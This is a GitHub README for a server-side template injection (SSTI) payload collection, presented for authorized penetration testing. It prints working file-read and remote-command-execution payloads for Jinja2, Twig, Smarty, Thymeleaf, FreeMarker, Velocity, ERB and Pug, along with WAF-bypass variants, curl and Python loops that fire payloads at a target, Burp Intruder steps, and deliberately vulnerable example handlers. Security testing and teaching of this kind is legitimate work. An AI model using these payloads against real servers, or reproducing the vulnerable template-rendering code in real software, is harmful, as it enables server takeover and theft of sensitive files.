# 🔥 SSTI Advanced Payload List

<div align="center">

![SSTI](https://img.shields.io/badge/SSTI-Template%20Injection-red?style=for-the-badge)
![Payloads](https://img.shields.io/badge/Payloads-2000%2B-brightgreen?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)
![Burp Suite](https://img.shields.io/badge/Burp%20Suite-Compatible-orange?style=for-the-badge)

**Comprehensive Server-Side Template Injection (SSTI) Security Testing Payload Collection**

</div>

---

## 📋 Table of Contents

- [Overview](#overview)
- [What is SSTI?](#what-is-ssti)
- [Features](#features)
- [Supported Template Engines](#supported-template-engines)
- [Installation](#installation)
- [Usage](#usage)
- [Payload Categories](#payload-categories)
- [Burp Suite Intruder Usage](#burp-suite-intruder-usage)
- [Example Scenarios](#example-scenarios)
- [Security and Ethical Use](#security-and-ethical-use)
- [Contributing](#contributing)
- [References](#references)
- [License](#license)

---

## 🎯 Overview

This repository contains a comprehensive collection of payloads for detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities during penetration testing and security assessments. It includes over 2000 carefully curated and tested payloads.

### ⚡ Quick Start

```bash
git clone https://github.com/payload-box/ssti-advanced-payload-list.git
cd ssti-advanced-payload-list
```

---

## 🔍 What is SSTI?

**Server-Side Template Injection (SSTI)** is a critical security vulnerability that allows an attacker to inject malicious code into the template engine used by a web application. This vulnerability occurs when user input is not properly sanitized before being processed by the template engine.

### Potential Impact

- 🔴 **Remote Code Execution (RCE)**: Execute arbitrary commands on the server
- 🔴 **Data Leakage**: Unauthorized access to sensitive files and data
- 🔴 **System Compromise**: Full server control
- 🔴 **Privilege Escalation**: Privilege escalation attacks
- 🔴 **Information Disclosure**: Access to system configuration and environment variables

---

## ✨ Features

- ✅ **2000+ Payloads**: Comprehensive and continuously updated payload collection
- ✅ **10+ Template Engines**: Specialized payloads for popular template engines
- ✅ **Burp Suite Compatible**: Formats optimized for Intruder
- ✅ **Polyglot Payloads**: Payloads that work across multiple template engines
- ✅ **Bypass Techniques**: WAF and filter bypass payloads
- ✅ **Categorized**: Organized by template engine
- ✅ **RCE Focused**: Optimized for remote code execution
- ✅ **File Reading**: Payloads for accessing sensitive files
- ✅ **Cross-Platform**: Payloads for Linux, Windows, macOS
- ✅ **Up-to-Date and Active**: Continuously updated with new techniques

---

## 🎨 Supported Template Engines

### Python Based
- **Jinja2** (Flask, Django)
  - 132 unique payloads
  - RCE, file read, information disclosure
  - Filter bypass techniques

### PHP Based
- **Twig** (Symfony)
  - 158 unique payloads
  - System command execution
  - File manipulation payloads
  
- **Smarty**
  - 238 unique payloads
  - PHP code execution
  - Comprehensive bypass techniques

### Java Based
- **Thymeleaf** (Spring Boot)
  - 164 unique payloads
  - Runtime.exec() exploitation
  - ProcessBuilder techniques
  
- **FreeMarker**
  - 161 unique payloads
  - Execute utility exploitation
  - ObjectConstructor techniques
  
- **Velocity** (Apache)
  - 269 unique payloads
  - ClassLoader manipulation
  - Reflection-based RCE

### Ruby Based
- **ERB** (Ruby on Rails)
  - 184 unique payloads
  - System command execution
  - File I/O operations

### JavaScript Based
- **Pug/Jade** (Node.js)
  - 226 unique payloads
  - child_process exploitation
  - require() abuse
  
- **EJS** (Express.js)
  - 200 unique payloads
  - Process manipulation
  - File system access

### Polyglot
- **Multi-Engine Payloads**
  - 171 unique payloads
  - Cross-platform compatibility
  - Multiple template engine support

---

## 📦 Installation

### Manual Installation

```bash
# Clone the repository
git clone https://github.com/payload-box/ssti-advanced-payload-list.git

# Navigate to directory
cd ssti-advanced-payload-list

# List payload files
ls Intruder/
```

### Burp Suite Installation

1. Open Burp Suite
2. Go to Intruder tab
3. Select Payloads tab
4. Click "Load" button
5. Select relevant payload file (e.g., `Intruder/jinja2-flask.txt`)

---

## 🚀 Usage

### Basic Usage

1. **Template Engine Detection**: Identify the template engine used by the target application
2. **Payload Selection**: Choose the relevant payload file
3. **Testing**: Send payloads to the target parameter
4. **Analysis**: Analyze responses and verify the vulnerability

### Command Line Usage

```bash
# Simple test with cURL
curl -X POST https://target.com/vulnerable \
  -d "name={{7*7}}"

# Reading payloads from file
while read payload; do
  curl -X POST https://target.com/search \
    -d "query=$payload" \
    --silent | grep -i "49\|error\|exception"
done < Intruder/jinja2-flask.txt
```

### Python Usage

```python
import requests

# Read payload file
with open('Intruder/jinja2-flask.txt', 'r') as f:
    payloads = f.readlines()

# Test each payload
for payload in payloads:
    payload = payload.strip()
    response = requests.post(
        'https://target.com/vulnerable',
        data={'input': payload}
    )
    
    # Check for successful injection
    if '49' in response.text or 'root:' in response.text:
        print(f"[+] Vulnerable: {payload}")
```

---

## 📚 Payload Categories

### 1. Detection Payloads
Basic mathematical operations to detect SSTI presence:
```
{{7*7}}          → 49
${7*7}           → 49
<%= 7*7 %>       → 49
{7*7}            → 49
```

### 2. Information Gathering
Collect system information:
```
{{config}}
${T(java.lang.System).getenv()}
<%= ENV %>
{$smarty.server}
#{process.env}
```

### 3. File Read
Read sensitive files:
```
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}
<%= File.read('/etc/passwd') %>
{php}echo file_get_contents('/etc/passwd');{/php}
```

### 4. Remote Code Execution
Execute system commands:
```
{{lipsum.__globals__['os'].popen('id').read()}}
${T(java.lang.Runtime).getRuntime().exec('id')}
<%= system('id') %>
{php}system('id');{/php}
${"freemarker.template.utility.Execute"?new()("id")}
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
#{process.mainModule.require('child_process').execSync('id').toString()}
```

### 5. WAF Bypass
Filter and WAF bypass techniques:
```
{{''['\x5f\x5fclass\x5f\x5f']}}
{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')}}
{{''.__class__.__mro__[2].__subclasses__()[396]('cat${IFS}/etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
${T(java.lang.Runtime).getRuntime().exec('cat$IFS/etc/passwd')}
```

### 6. Polyglot Payloads
Works across multiple template engines:
```
{{7*7}}${7*7}<%= 7*7 %>{7*7}
{{config}}${_self}<%= self %>{$smarty}
```

---

## 🎯 Burp Suite Intruder Usage

### Step 1: Target Configuration
```
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

query=§test§
```

### Step 2: Payload Loading
1. Mark injection point with `§§` in **Positions** tab
2. Go to **Payloads** tab
3. **Payload type**: Simple list
4. **Payload Options**: Load → Select relevant payload file
5. **Payload Encoding**: Enable URL-encode if needed

### Step 3: Launch Attack
1. Click **Start attack** button
2. Filter responses:
   - Status code: 200, 500
   - Length differences
   - Regex: `(49|root:|uid=|gid=|groups=)`

### Step 4: Result Analysis
```
✓ If "49" appears in response → {{7*7}} executed
✓ If "root:x:0:0" appears → /etc/passwd was read
✓ If "uid=33(www-data)" appears → RCE successful
```

---

## 💡 Example Scenarios

### Scenario 1: Flask/Jinja2 RCE

**Vulnerability:**
```python
@app.route('/hello/<name>')
def hello(name):
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
```

**Payload:**
```
{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
```

**Result:** Contents of `/etc/passwd` file are returned.

---

### Scenario 2: Spring Boot/Thymeleaf RCE

**Vulnerability:**
```java
@GetMapping("/welcome")
public String welcome(@RequestParam String name, Model model) {
    model.addAttribute("name", name);
    return "welcome";
}
```

**Payload:**
```
${T(java.lang.Runtime).getRuntime().exec('whoami')}
```

**Result:** System username is executed.

---

### Scenario 3: Node.js/Pug RCE

**Vulnerability:**
```javascript
app.get('/profile', (req, res) => {
    const username = req.query.username;
    const html = pug.render(`h1 Welcome ${username}`);
    res.send(html);
});
```

**Payload:**
```
#{process.mainModule.require('child_process').execSync('ls -la').toString()}
```

**Result:** Directory contents are listed.

---

### Scenario 4: PHP/Twig File Read

**Vulnerability:**
```php
$template = $twig->createTemplate("Hello {{ name }}!");
echo $template->render(['name' => $_GET['name']]);
```

**Payload:**
```
{{['cat /etc/passwd']|filter('system')}}
```

**Result:** `/etc/passwd` file is read.

---

## 🔒 Security and Ethical Use

### ⚠️ WARNING

Payloads in this repository are **for educational and authorized penetration testing purposes only**.

### Legal Usage Principles

✅ **DO:**
- Test only on systems you are authorized to test
- Obtain written permission (penetration testing contract)
- Take backups before testing
- Keep test results confidential
- Report findings responsibly (Responsible Disclosure)

❌ **DON'T:**
- Attack systems without authorization
- Test public systems
- Steal or modify data
- Damage systems
- Conduct unauthorized security tests

### Disclaimer

All legal and ethical responsibility for the use of these tools belongs to the user. The author(s) cannot be held responsible for misuse of these payloads. Check local laws and regulations before use.

---

## 🤝 Contributing

We welcome your contributions! To contribute to this project:

### Contribution Process

1. **Fork** the repository
2. Create a **feature branch** (`git checkout -b feature/amazing-payloads`)
3. **Commit** your changes (`git commit -m 'Add amazing payloads'`)
4. **Push** your branch (`git push origin feature/amazing-payloads`)
5. Open a **Pull Request**

### Types of Contributions

- 🆕 Adding new payloads
- 🐛 Fixing broken payloads
- 📝 Documentation improvements
- 🔧 Adding template engine support
- 🌐 Translation contributions
- 💡 New bypass techniques

### Payload Addition Rules

1. Test the payload and verify it works
2. Add to the relevant template engine file
3. Add descriptive comments (if needed)
4. Avoid duplicate payloads
5. Update README (if needed)

---

## 📖 References

### Research and Articles

- [PortSwigger - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [OWASP - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)
- [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

### Template Engine Documentation

- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [Twig Documentation](https://twig.symfony.com/)
- [Thymeleaf Documentation](https://www.thymeleaf.org/)
- [FreeMarker Documentation](https://freemarker.apache.org/)
- [Velocity Documentation](https://velocity.apache.org/)
- [ERB Documentation](https://ruby-doc.org/stdlib-3.0.0/libdoc/erb/rdoc/ERB.html)
- [Pug Documentation](https://pugjs.org/)
- [EJS Documentation](https://ejs.co/)
- [Smarty Documentation](https://www.smarty.net/)

### CTF and Lab Environments

- [PortSwigger Web Security Academy](https://portswigger.net/web-security/all-labs)
- [HackTheBox](https://www.hackthebox.eu/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)

---

## 📊 Statistics

```
Total Payloads:        2000+
Template Engines:      10+
File Size:             ~500KB
Languages:             Python, PHP, Java, Ruby, JavaScript
Last Updated:          2024
Contributors:          Open Source Community
```

---

## 🌟 Feature Roadmap

- [ ] GraphQL SSTI payloads
- [ ] Go template payloads
- [ ] Rust template payloads
- [ ] ASP.NET Razor payloads
- [ ] Automated testing scripts
- [ ] Docker test environment
- [ ] Interactive web interface
- [ ] Payload obfuscation techniques
- [ ] AI-powered payload generation

---

## 📞 Contact and Support

### Have Questions?

- 📧 **Email**: [Contact repository owner]
- 🐛 **Issues**: [GitHub Issues](https://github.com/payload-box/ssti-advanced-payload-list/issues)
- 💬 **Discussions**: [GitHub Discussions](https://github.com/payload-box/ssti-advanced-payload-list/discussions)

### Social Media

- 🐦 **Twitter**: [@payload_box]
- 💼 **LinkedIn**: [Payload Box]

---

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=payload-box/ssti-advanced-payload-list&type=Date)](https://star-history.com/#payload-box/ssti-advanced-payload-list&Date)

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).

```
MIT License

Copyright (c) 2024 Payload Box

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🙏 Acknowledgments

Thanks to everyone who contributed to this project:

- Security research community
- Open source contributors
- Bug hunters and penetration testers
- Template engine developers
- Everyone who reported issues and suggested improvements

---

## 📚 Additional Resources

### Video Tutorials
- [SSTI Exploitation Basics](https://youtube.com)
- [Advanced SSTI Techniques](https://youtube.com)
- [Burp Suite Intruder Mastery](https://youtube.com)

### Blog Posts
- [Understanding SSTI Vulnerabilities](https://blog.example.com)
- [Real-World SSTI Case Studies](https://blog.example.com)
- [SSTI Prevention Best Practices](https://blog.example.com)

### Books
- "Web Application Hacker's Handbook"
- "The Tangled Web"
- "Breaking and Entering"

---

<div align="center">

### 🔥 If you like this project, don't forget to give it a ⭐!

**[⬆ Back to Top](#-ssti-advanced-payload-list)**

---

Made with ❤️ by Security Researchers | For Educational Purposes Only

**Stay Legal • Stay Ethical • Stay Secure**

</div>
